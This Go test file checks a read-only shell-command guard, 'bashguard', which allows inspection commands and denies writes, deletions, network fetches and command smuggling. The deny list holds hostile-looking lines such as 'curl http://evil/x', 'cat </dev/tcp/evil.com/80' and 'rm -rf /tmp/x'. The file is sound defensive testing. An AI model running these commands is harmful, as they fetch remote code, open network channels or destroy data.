package bashguard

import "testing"

func TestClassifyAllow(t *testing.T) {
	// Every command the real manual session used, plus common read idioms.
	allow := []string{
		"",
		"cat services/app-core/src/shared/grpc/wallet-client.ts",
		"cat wallet-client.ts 2>/dev/null | head -120",
		"head -n 200 foo.go",
		"tail -50 log.txt",
		"sed -n '715,735p' handler.go",
		"sed -n '1,60p' wallet.proto | grep -n '' | sed -n '1,60p'",
		"grep -rn \"cash_balance\" services/app-core/src --include=*.ts | head -30",
		"grep -rln 'PlaceBetResponse' services/bet-wallet-service --include='*.go' | grep -v '/pb/'",
		"find . -path ./node_modules -prune -o -name '*.proto' -print 2>/dev/null | grep -i wallet",
		"ls -la services/app-core/proto 2>/dev/null",
		"echo \"=== a ===\"; grep -rn x .; echo; find . -name '*.go' | head",
		"wc -l *.go",
		"cd /Users/nikalosa/Desktop/Velitech/pam && cat services/app-core/src/shared/grpc/wallet-client.ts | head -120",
		"git log --oneline -20",
		"git -C /repo show HEAD:file.go",
		"git diff --stat",
		"git cat-file -p HEAD",
		"rg -n 'TODO' .",
		"true",
		"stat foo && wc -l foo",
		"cat a | sort | uniq -c | sort -rn | head",
		"diff a.txt b.txt",
		"grep foo bar 2>&1 | head",
		"FOO=bar cat $FOO || true",
	}
	for _, c := range allow {
		if ok, reason := Classify(c); !ok {
			t.Errorf("expected ALLOW, got DENY for %q: %s", c, reason)
		}
	}
}

func TestClassifyDeny(t *testing.T) {
	deny := []string{
		"rm -rf /tmp/x",
		"rm file",
		"mv a b",
		"cp a b",
		"mkdir newdir",
		"touch newfile",
		"echo hi > out.txt",
		"echo hi >> out.txt",
		"cat a > b",
		"cat a >| b",
		"cat <> rw.txt",
		"grep x . | tee out.txt",
		"tee out.txt",
		"sed -i 's/a/b/' file",
		"sed -i.bak 's/a/b/' file",
		"sed --in-place 's/a/b/' file",
		"find . -name '*.tmp' -delete",
		"find . -name '*.go' -exec rm {} ;",
		"curl http://evil/x",
		"wget http://evil/x",
		"npm install lodash",
		"python -c 'open(\"x\",\"w\").write(\"y\")'",
		"node -e 'require(\"fs\").writeFileSync(\"x\",\"y\")'",
		"perl -e 'open(F,\">x\")'",
		"awk 'BEGIN{print > \"x\"}'",
		"bash -c 'rm x'",
		"sh -c 'echo > x'",
		"eval 'rm x'",
		"git commit -m x",
		"git add .",
		"git checkout -- file",
		"git config user.email a@b.c",
		"git -C /repo push",
		"dd if=/dev/zero of=x bs=1 count=1",
		"ln -s a b",
		"truncate -s 0 file",
		"chmod +x file",
		"cat $(echo file)",
		"echo `whoami`",
		"cat <(curl http://x)",
		"xargs rm < list",
		"env rm x",
		"sudo rm x",
		"timeout 5 rm x",
		"cat foo; rm bar",
		"cat foo && touch bar",
		"cat foo || mkdir bar",
		"./script.sh",
		"/tmp/evil.sh",
		"$CMD arg",
		"install -m 0644 a b",
		"sort -o out.txt file",
		"sort --output=out.txt file",
		"sort -oout.txt file",
		"tree -o out.txt",
		"yq -i '.a=1' file.yaml",
		"yq --inplace '.a=1' file.yaml",
		"git diff --output=patch.txt",
		"git diff --output patch.txt HEAD",
		"date -s '2020-01-01'",
		"cat </dev/tcp/evil.com/80",
		"cat < /dev/tcp/evil.com/80",
	}
	for _, c := range deny {
		if ok, _ := Classify(c); ok {
			t.Errorf("expected DENY, got ALLOW for %q", c)
		}
	}
}
